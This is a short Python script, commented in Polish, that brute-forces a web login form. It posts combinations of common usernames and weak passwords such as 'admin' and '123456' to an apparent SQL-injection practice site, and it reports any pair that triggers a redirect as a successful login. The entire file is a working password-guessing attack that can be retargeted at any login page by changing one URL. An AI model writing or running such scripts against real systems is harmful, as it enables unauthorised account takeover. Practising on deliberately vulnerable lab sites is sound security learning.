import urllib.request
import urllib.parse
import urllib.error

# Konfiguracja
target_url = "https://ashkiani.github.io/sql-injection-playground/"
usernames = ["admin", "user", "test"]
passwords = ["123456", "admin123", "password", "qwerty", "letmein"]

username_field = "username"
password_field = "password"

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0'
}

# Funkcja do pojedynczej próby logowania
def attempt_login(url, username, password):
    post_data = {
        username_field: username,
        password_field: password
    }

    encoded_data = urllib.parse.urlencode(post_data).encode('utf-8')
    req = urllib.request.Request(url, data=encoded_data, headers=headers)

    try:
        response = urllib.request.urlopen(req, timeout=5)

        # Sprawdzenie, czy nastąpiło przekierowanie (czyli zmiana URL)
        final_url = response.geturl()

        if final_url != url:
            print(f"[✔] Zalogowano: {username}:{password} → Przekierowano {final_url}")
            return True
        else:
            print(f"[✘] Błąd: {username}:{password}")
            return False

    except (urllib.error.HTTPError, urllib.error.URLError) as e:
        print(f"[!] Błąd połączenia dla {username}:{password} → {e}")
        return False

# Główna pętla brute-force
def main():
    print("=== Brute-force login test ===\n")
    for username in usernames:
        for password in passwords:
            success = attempt_login(target_url, username, password)
            if success:
                return  # zakończ po pierwszym udanym logowaniu
    print("\n[✘] Brak poprawnych danych logowania.")

if __name__ == "__main__":
    main()
